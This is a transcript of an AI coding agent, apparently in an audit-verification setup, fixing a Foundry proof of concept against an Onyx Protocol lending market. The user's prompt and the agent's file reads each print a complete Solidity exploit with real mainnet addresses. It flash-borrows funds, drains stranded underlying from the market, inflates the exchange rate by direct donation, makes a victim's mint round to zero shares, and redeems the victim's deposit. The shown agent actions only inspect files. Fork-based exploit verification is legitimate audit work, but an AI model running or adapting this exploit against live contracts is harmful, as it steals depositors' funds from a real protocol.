@@ -1,0 +1,2766 @@
+OpenAI Codex v0.130.0
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR, /Users/zhanglongqin/.codex/memories]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e35cd-0ebe-70a1-b6da-653a801df7aa
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Direct underlying donations can inflate the exchange rate until later minters receive zero shares
+- claim: The market prices shares from the raw underlying balance via `getCashPrior()`, so unsolicited token transfers raise the exchange rate without minting new oTokens. `mintFresh()` then computes `mintTokens = floor(actualMintAmount / exchangeRate)` and never rejects `mintTokens == 0`, allowing a seeded holder to donate enough underlying that a later depositor transfers assets in but receives no shares.
+- impact: A permissionless attacker can steal later deposits on thin or freshly seeded markets. After becoming the only shareholder and donating underlying directly to the market, the attacker can force a victim mint to round to zero and then redeem the victim's deposited assets together with the donation.
+- exploit_paths: ["Attacker mints a minimal amount to become the only oToken holder", "Attacker transfers underlying directly to the oToken contract, increasing `getCashPrior()` without increasing `totalSupply`", "Victim calls `mint()` and `mintTokens` truncates to 0", "Attacker redeems their existing shares and withdraws both their donation and the victim's deposit"]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IOErc20Like {
+    function underlying() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function getCash() external view returns (uint256);
+    function exchangeRateStored() external view returns (uint256);
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract VictimMinter {
+    constructor() {}
+
+    function supplyAndMint(address underlying, address market, uint256 amount) external {
+        _forceApprove(underlying, market, 0);
+        _forceApprove(underlying, market, amount);
+
+        uint256 err = IOErc20Like(market).mint(amount);
+        require(err == 0, "victim mint failed");
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+}
+
+contract FlawVerifier {
+    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
+
+    bool public attempted;
+    bool public hypothesisValidated;
+    uint256 public seedAmountUsed;
+    uint256 public donationAmountUsed;
+    uint256 public victimMintAmountUsed;
+    uint256 public attackerSharesBeforeRedeem;
+    string public lastFailureReason;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool private _inFlashCallback;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        address underlying = TARGET.underlying();
+        _profitToken = underlying;
+
+        uint256 existingSupply = TARGET.totalSupply();
+        if (existingSupply != 0) {
+            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+            return;
+        }
+
+        uint256 strandedCash = TARGET.getCash();
+        if (strandedCash == 0) {
+            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+            return;
+        }
+
+        uint256 seed = _minimumSeedAmount();
+        if (seed == 0) {
+            lastFailureReason = "invalid seed amount";
+            return;
+        }
+
+        _flashBorrowSeed(underlying, seed);
+
+        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        _profitAmount = finalUnderlyingBalance;
+        if (_profitAmount == 0) {
+            lastFailureReason = "execution completed without positive realized underlying";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(!_inFlashCallback, "callback reentered");
+
+        _inFlashCallback = true;
+
+        address underlying = TARGET.underlying();
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount > 0, "zero flash amount");
+
+        _forceApprove(underlying, address(TARGET), 0);
+        _forceApprove(underlying, address(TARGET), type(uint256).max);
+
+        // Bootstrap funding for the documented F-001 path:
+        // because the market has zero supply, a tiny flash-borrowed seed can mint the first shares and
+        // immediately redeem all raw underlying already stranded in the market. That public on-chain cash
+        // then funds the same four-stage donation -> zero-share victim mint -> redeem sequence below.
+        uint256 bootstrapSeed = borrowedAmount;
+        uint256 mintErr = TARGET.mint(bootstrapSeed);
+        require(mintErr == 0, "bootstrap mint failed");
+
+        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+        require(bootstrapShares > 0, "bootstrap shares zero");
+
+        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+        require(redeemErr == 0, "bootstrap redeem failed");
+
+        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+
+        _runCoreExploitPath(underlying);
+
+        _inFlashCallback = false;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runCoreExploitPath(address underlying) internal {
+        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+
+        uint256 seed = _minimumSeedAmount();
+        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+
+        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
+        uint256 mintErr = TARGET.mint(seed);
+        require(mintErr == 0, "seed mint failed");
+        seedAmountUsed = seed;
+
+        uint256 attackerShares = TARGET.balanceOf(address(this));
+        attackerSharesBeforeRedeem = attackerShares;
+        require(attackerShares > 0, "seed mint returned zero shares");
+
+        // Path stage 2: attacker transfers underlying directly to the oToken contract,
+        // increasing getCashPrior() without increasing totalSupply.
+        uint256 victimDeposit = 1;
+        uint256 donationNeeded;
+        if (attackerShares >= seed) {
+            donationNeeded = attackerShares - seed + 1;
+        } else {
+            donationNeeded = 1;
+        }
+
+        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+
+        _safeTransfer(underlying, address(TARGET), donationNeeded);
+        donationAmountUsed = donationNeeded;
+
+        VictimMinter victim = new VictimMinter();
+        _safeTransfer(underlying, address(victim), victimDeposit);
+        victimMintAmountUsed = victimDeposit;
+
+        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+        uint256 cashBeforeVictimMint = TARGET.getCash();
+
+        // Path stage 3: victim mints after the donation and receives zero oTokens because
+        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never rejects 0.
+        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+
+        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+        uint256 cashAfterVictimMint = TARGET.getCash();
+        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+
+        // Path stage 4: attacker redeems the sole existing shares and withdraws both the donation and victim deposit.
+        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
+        require(redeemFinalErr == 0, "attacker redeem failed");
+
+        hypothesisValidated = true;
+    }
+
+    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+        address token0 = PEPE_WETH_V2_PAIR.token0();
+        address token1 = PEPE_WETH_V2_PAIR.token1();
+
+        if (token0 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+            return;
+        }
+        if (token1 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+            return;
+        }
+
+        revert("configured pair does not contain underlying");
+    }
+
+    function _minimumSeedAmount() internal view returns (uint256) {
+        uint256 exchangeRate = TARGET.exchangeRateStored();
+        uint256 seed = exchangeRate / 1e18;
+        if (exchangeRate % 1e18 != 0) {
+            seed += 1;
+        }
+        if (seed == 0) {
+            seed = 1;
+        }
+        return seed;
+    }
+
+    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+Compiler run failed:
+Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
+SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
+  --> src/FlawVerifier.sol:47:28:
+   |
+47 |         IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
+   |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+```
+
+forge stderr (tail):
+```
+Error: Compilation failed
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+codex
+I’m reviewing the current PoC and surrounding repo context first so I can fix the compile failure without breaking the exploit path or the anti-cheat constraints.
+exec
+/bin/bash -lc 'pwd && rg -n "F-001|Direct underlying donations|FlawVerifier|executeOnOpportunity|5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750|A43fE16908251ee70EF74718545e4FE6C5cCEc9f|A43fe16908251ee70EF74718545e4FE6C5cCEc9f" -S .' in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+./FlawVerifier.sol:44:contract FlawVerifier {
+./FlawVerifier.sol:45:    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+./FlawVerifier.sol:47:        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
+./FlawVerifier.sol:64:    function executeOnOpportunity() external {
+./FlawVerifier.sol:116:        // becomes the working capital used for the documented four-stage F-001 path below.
+
+exec
+/bin/bash -lc 'rg --files .' in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+./onchain_auto/_index.json
+./onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/_etherscan_meta.json
+./onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OErc20Delegator.sol
+./onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/InterestRateModel.sol
+./onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OTokenInterfaces.sol
+./onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/ComptrollerInterface.sol
+./onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/EIP20NonStandardInterface.sol
+./onchain_auto/0x9dcb6bc351ab416f35aeab1351776e2ad295abc4/Contract.sol
+./onchain_auto/0x9dcb6bc351ab416f35aeab1351776e2ad295abc4/_etherscan_meta.json
+./FlawVerifier.sol
+
+codex
+I found the verifier and the auto-fetched target source. Next I’m checking the market implementation details and the current PoC flow to see whether the checksum fix is sufficient or whether the flashswap path also needs runtime hardening.
+exec
+/bin/bash -lc "sed -n '1,260p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IOErc20Like {
+    function underlying() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function getCash() external view returns (uint256);
+    function exchangeRateStored() external view returns (uint256);
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract VictimMinter {
+    constructor() {}
+
+    function supplyAndMint(address underlying, address market, uint256 amount) external {
+        _forceApprove(underlying, market, 0);
+        _forceApprove(underlying, market, amount);
+
+        uint256 err = IOErc20Like(market).mint(amount);
+        require(err == 0, "victim mint failed");
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+}
+
+contract FlawVerifier {
+    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
+
+    bool public attempted;
+    bool public hypothesisValidated;
+    uint256 public seedAmountUsed;
+    uint256 public donationAmountUsed;
+    uint256 public victimMintAmountUsed;
+    uint256 public attackerSharesBeforeRedeem;
+    string public lastFailureReason;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool private _inFlashCallback;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        address underlying = TARGET.underlying();
+        _profitToken = underlying;
+
+        uint256 existingSupply = TARGET.totalSupply();
+        if (existingSupply != 0) {
+            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+            return;
+        }
+
+        uint256 strandedCash = TARGET.getCash();
+        if (strandedCash == 0) {
+            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+            return;
+        }
+
+        uint256 seed = _minimumSeedAmount();
+        if (seed == 0) {
+            lastFailureReason = "invalid seed amount";
+            return;
+        }
+
+        _flashBorrowSeed(underlying, seed);
+
+        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        _profitAmount = finalUnderlyingBalance;
+        if (_profitAmount == 0) {
+            lastFailureReason = "execution completed without positive realized underlying";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(!_inFlashCallback, "callback reentered");
+
+        _inFlashCallback = true;
+
+        address underlying = TARGET.underlying();
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount > 0, "zero flash amount");
+
+        _forceApprove(underlying, address(TARGET), 0);
+        _forceApprove(underlying, address(TARGET), type(uint256).max);
+
+        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+        // becomes the working capital used for the documented four-stage F-001 path below.
+        uint256 bootstrapSeed = borrowedAmount;
+        uint256 mintErr = TARGET.mint(bootstrapSeed);
+        require(mintErr == 0, "bootstrap mint failed");
+
+        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+        require(bootstrapShares > 0, "bootstrap shares zero");
+
+        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+        require(redeemErr == 0, "bootstrap redeem failed");
+
+        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+
+        _runCoreExploitPath(underlying);
+
+        _inFlashCallback = false;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runCoreExploitPath(address underlying) internal {
+        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+
+        uint256 seed = _minimumSeedAmount();
+        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+
+        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
+        uint256 mintErr = TARGET.mint(seed);
+        require(mintErr == 0, "seed mint failed");
+        seedAmountUsed = seed;
+
+        uint256 attackerShares = TARGET.balanceOf(address(this));
+        attackerSharesBeforeRedeem = attackerShares;
+        require(attackerShares > 0, "seed mint returned zero shares");
+
+        // Stage 2 requires a direct underlying donation that raises the exchange rate
+        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+        // remains minimal and deterministic; the economic profit here comes from the market's
+        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
+        uint256 victimDeposit = 1;
+        uint256 donationNeeded;
+        if (attackerShares >= seed) {
+            donationNeeded = attackerShares - seed + 1;
+        } else {
+            donationNeeded = 1;
+        }
+
+        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+
+        _safeTransfer(underlying, address(TARGET), donationNeeded);
+        donationAmountUsed = donationNeeded;
+
+        VictimMinter victim = new VictimMinter();
+        _safeTransfer(underlying, address(victim), victimDeposit);
+        victimMintAmountUsed = victimDeposit;
+
+        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+        uint256 cashBeforeVictimMint = TARGET.getCash();
+
+        // Path stage 3: victim mints after the donation and receives zero oTokens because
+        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+        // rejects mintTokens == 0.
+        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+
+        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+        uint256 cashAfterVictimMint = TARGET.getCash();
+        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+
+        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+        // direct donation and the victim's deposit.
+        uint256 redeemErr = TARGET.redeem(attackerShares);
+        require(redeemErr == 0, "attacker redeem failed");
+
+        hypothesisValidated = true;
+    }
+
+    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+        address token0 = PEPE_WETH_V2_PAIR.token0();
+        address token1 = PEPE_WETH_V2_PAIR.token1();
+
+        if (token0 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+            return;
+        }
+        if (token1 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+            return;
+        }
+
+        revert("configured pair does not contain underlying");
+    }
+
+    function _minimumSeedAmount() internal view returns (uint256) {
+        uint256 exchangeRate = TARGET.exchangeRateStored();
+        uint256 seed = exchangeRate / 1e18;
+        if (exchangeRate % 1e18 != 0) {
+            seed += 1;
+        }
+        if (seed == 0) {
+            seed = 1;
+        }
+        return seed;
+    }
+
+    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+
+exec
+/bin/bash -lc "sed -n '1,260p' onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OTokenInterfaces.sol" in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+exec
+/bin/bash -lc "sed -n '1,260p' onchain_auto/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750/contracts/OErc20Delegator.sol" in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+pragma solidity ^0.5.16;
+
+import "./ComptrollerInterface.sol";
+import "./InterestRateModel.sol";
+import "./EIP20NonStandardInterface.sol";
+
+contract OTokenStorage {
+    /**
+     * @dev Guard variable for re-entrancy checks
+     */
+    bool internal _notEntered;
+
+    /**
+     * @notice EIP-20 token name for this token
+     */
+    string public name;
+
+    /**
+     * @notice EIP-20 token symbol for this token
+     */
+    string public symbol;
+
+    /**
+     * @notice EIP-20 token decimals for this token
+     */
+    uint8 public decimals;
+
+    /**
+     * @notice Maximum borrow rate that can ever be applied (.0005% / block)
+     */
+
+    uint internal constant borrowRateMaxMantissa = 0.0005e16;
+
+    /**
+     * @notice Maximum fraction of interest that can be set aside for reserves
+     */
+    uint internal constant reserveFactorMaxMantissa = 1e18;
+
+    /**
+     * @notice Administrator for this contract
+     */
+    address payable public admin;
+
+    /**
+     * @notice Pending administrator for this contract
+     */
+    address payable public pendingAdmin;
+
+    /**
+     * @notice Contract which oversees inter-oToken operations
+     */
+    ComptrollerInterface public comptroller;
+
+    /**
+     * @notice Model which tells what the current interest rate should be
+     */
+    InterestRateModel public interestRateModel;
+
+    /**
+     * @notice Initial exchange rate used when minting the first OTokens (used when totalSupply = 0)
+     */
+    uint internal initialExchangeRateMantissa;
+
+    /**
+     * @notice Fraction of interest currently set aside for reserves
+     */
+    uint public reserveFactorMantissa;
+
+    /**
+     * @notice Block number that interest was last accrued at
+     */
+    uint public accrualBlockNumber;
+
+    /**
+     * @notice Accumulator of the total earned interest rate since the opening of the market
+     */
+    uint public borrowIndex;
+
+    /**
+     * @notice Total amount of outstanding borrows of the underlying in this market
+     */
+    uint public totalBorrows;
+
+    /**
+     * @notice Total amount of reserves of the underlying held in this market
+     */
+    uint public totalReserves;
+
+    /**
+     * @notice Total number of tokens in circulation
+     */
+    uint public totalSupply;
+
+    /**
+     * @notice Official record of token balances for each account
+     */
+    mapping (address => uint) internal accountTokens;
+
+    /**
+     * @notice Approved token transfer amounts on behalf of others
+     */
+    mapping (address => mapping (address => uint)) internal transferAllowances;
+
+    /**
+     * @notice Container for borrow balance information
+     * @member principal Total balance (with accrued interest), after applying the most recent balance-changing action
+     * @member interestIndex Global borrowIndex as of the most recent balance-changing action
+     */
+    struct BorrowSnapshot {
+        uint principal;
+        uint interestIndex;
+    }
+
+    /**
+     * @notice Mapping of account addresses to outstanding borrow balances
+     */
+    mapping(address => BorrowSnapshot) internal accountBorrows;
+
+    /**
+     * @notice Share of seized collateral that is added to reserves
+     */
+    uint public constant protocolSeizeShareMantissa = 2.8e16; //2.8%
+
+}
+
+contract OTokenInterface is OTokenStorage {
+    /**
+     * @notice Indicator that this is a OToken contract (for inspection)
+     */
+    bool public constant isOToken = true;
+
+
+    /*** Market Events ***/
+
+    /**
+     * @notice Event emitted when interest is accrued
+     */
+    event AccrueInterest(uint cashPrior, uint interestAccumulated, uint borrowIndex, uint totalBorrows);
+
+    /**
+     * @notice Event emitted when tokens are minted
+     */
+    event Mint(address minter, uint mintAmount, uint mintTokens);
+
+    /**
+     * @notice Event emitted when tokens are redeemed
+     */
+    event Redeem(address redeemer, uint redeemAmount, uint redeemTokens);
+
+    /**
+     * @notice Event emitted when underlying is borrowed
+     */
+    event Borrow(address borrower, uint borrowAmount, uint accountBorrows, uint totalBorrows);
+
+    /**
+     * @notice Event emitted when a borrow is repaid
+     */
+    event RepayBorrow(address payer, address borrower, uint repayAmount, uint accountBorrows, uint totalBorrows);
+
+    /**
+     * @notice Event emitted when a borrow is liquidated
+     */
+    event LiquidateBorrow(address liquidator, address borrower, uint repayAmount, address oTokenCollateral, uint seizeTokens);
+
+
+    /*** Admin Events ***/
+
+    /**
+     * @notice Event emitted when pendingAdmin is changed
+     */
+    event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);
+
+    /**
+     * @notice Event emitted when pendingAdmin is accepted, which means admin is updated
+     */
+    event NewAdmin(address oldAdmin, address newAdmin);
+
+    /**
+     * @notice Event emitted when comptroller is changed
+     */
+    event NewComptroller(ComptrollerInterface oldComptroller, ComptrollerInterface newComptroller);
+
+    /**
+     * @notice Event emitted when interestRateModel is changed
+     */
+    event NewMarketInterestRateModel(InterestRateModel oldInterestRateModel, InterestRateModel newInterestRateModel);
+
+    /**
+     * @notice Event emitted when the reserve factor is changed
+     */
+    event NewReserveFactor(uint oldReserveFactorMantissa, uint newReserveFactorMantissa);
+
+    /**
+     * @notice Event emitted when the reserves are added
+     */
+    event ReservesAdded(address benefactor, uint addAmount, uint newTotalReserves);
+
+    /**
+     * @notice Event emitted when the reserves are reduced
+     */
+    event ReservesReduced(address admin, uint reduceAmount, uint newTotalReserves);
+
+    /**
+     * @notice EIP20 Transfer event
+     */
+    event Transfer(address indexed from, address indexed to, uint amount);
+
+    /**
+     * @notice EIP20 Approval event
+     */
+    event Approval(address indexed owner, address indexed spender, uint amount);
+
+    /**
+     * @notice Failure event
+     */
+    event Failure(uint error, uint info, uint detail);
+
+
+    /*** User Interface ***/
+
+    function transfer(address dst, uint amount) external returns (bool);
+    function transferFrom(address src, address dst, uint amount) external returns (bool);
+    function approve(address spender, uint amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint);
+    function balanceOf(address owner) external view returns (uint);
+    function balanceOfUnderlying(address owner) external returns (uint);
+    function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint);
+    function borrowRatePerBlock() external view returns (uint);
+    function supplyRatePerBlock() external view returns (uint);
+    function totalBorrowsCurrent() external returns (uint);
+    function borrowBalanceCurrent(address account) external returns (uint);
+    function borrowBalanceStored(address account) public view returns (uint);
+    function exchangeRateCurrent() public returns (uint);
+    function exchangeRateStored() public view returns (uint);
+    function getCash() external view returns (uint);
+    function accrueInterest() public returns (uint);
+    function seize(address liquidator, address borrower, uint seizeTokens) external returns (uint);
+
+
+    /*** Admin Functions ***/
+
+    function _setPendingAdmin(address payable newPendingAdmin) external returns (uint);
+    function _acceptAdmin() external returns (uint);
+    function _setComptroller(ComptrollerInterface newComptroller) public returns (uint);
+    function _setReserveFactor(uint newReserveFactorMantissa) external returns (uint);
+    function _reduceReserves(uint reduceAmount) external returns (uint);
+    function _setInterestRateModel(InterestRateModel newInterestRateModel) public returns (uint);
+}
+
+contract OErc20Storage {
+    /**
+     * @notice Underlying asset for this OToken
+     */
+    address public underlying;
+}
+
+contract OErc20Interface is OErc20Storage {
+
+    /*** User Interface ***/
+
+
+ succeeded in 0ms:
+pragma solidity ^0.5.16;
+
+import "./OTokenInterfaces.sol";
+
+/**
+ * @title Onyx's OErc20Delegator Contract
+ * @notice OTokens which wrap an EIP-20 underlying and delegate to an implementation
+ * @author Onyx
+ */
+contract OErc20Delegator is OTokenInterface, OErc20Interface, ODelegatorInterface {
+    /**
+     * @notice Construct a new money market
+     * @param underlying_ The address of the underlying asset
+     * @param comptroller_ The address of the Comptroller
+     * @param interestRateModel_ The address of the interest rate model
+     * @param initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18
+     * @param name_ ERC-20 name of this token
